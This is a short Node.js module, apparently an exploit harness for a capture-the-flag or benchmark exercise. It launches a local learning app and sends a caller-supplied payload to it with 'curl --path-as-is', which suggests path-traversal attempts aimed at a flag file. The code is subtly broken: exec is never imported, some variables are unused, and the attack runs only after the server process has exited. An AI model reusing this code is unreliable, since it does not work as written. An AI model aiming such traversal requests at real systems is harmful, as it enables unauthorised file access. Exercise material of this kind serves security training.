const path = require("path");
const { sleep } = require("sleep");

function exploitFunction(payload) {
  const fs = require("fs");

  const pathToFlag = path.resolve(__dirname, "../flag.html");

  return new Promise((resolve, reject) => {
    const server = "node ./node_modules/fakelearnnodejs/app.js";
    const exe = exec(server, (error, stdout) => {
      if (error) {
        console.error(`Error starting server: ${error}`);
        return;
      }

      sleep.sleep(2); // Wait for the server to start

      const attack_string = `curl -v --path-as-is "http://127.0.0.1:3000${payload}"`;
      exec(attack_string, (error, stdout) => {
        if (error) {
          console.error(`Error executing attack: ${error}`);
          return;
        }
        resolve(stdout);
      });
    });

    exe.on('exit', (code) => {
      if (code !== 0) {
        reject(new Error(`Server exited with code ${code}`));
      }
    });
  });
}

module.exports = { exploitFunction };